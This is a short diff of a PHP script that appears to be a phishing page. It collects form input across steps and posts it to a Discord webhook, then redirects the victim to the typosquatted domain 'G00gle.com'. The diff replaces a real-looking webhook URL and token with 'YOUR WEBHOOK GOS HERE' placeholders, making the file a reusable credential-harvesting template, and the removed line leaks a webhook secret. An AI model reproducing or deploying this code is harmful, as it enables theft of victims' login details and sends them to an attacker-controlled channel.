@@ -1,6 +1,6 @@
 <?php
 
-$webhook = "https://discordapp.com/api/webhooks/1502075217466491112/qyXbGqWO3-rXVoLmeekoukSTY642_ZVXj7RSjTl544oDM5mK43UlY0CcUMnJbwWC7tjd";
+$webhook = "YOUR WEBHOOK GOS HERE";
 
 // default step
 $step = $_POST["step"] ?? 1;
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             $context = stream_context_create($options);
             file_get_contents($webhook, false, $context);
 
-            // redirect after send
+            //                                                                      AND YOUR AFTER LOGIN GOS HERE
             header("Location:https://G00gle.com");
             exit;
         }
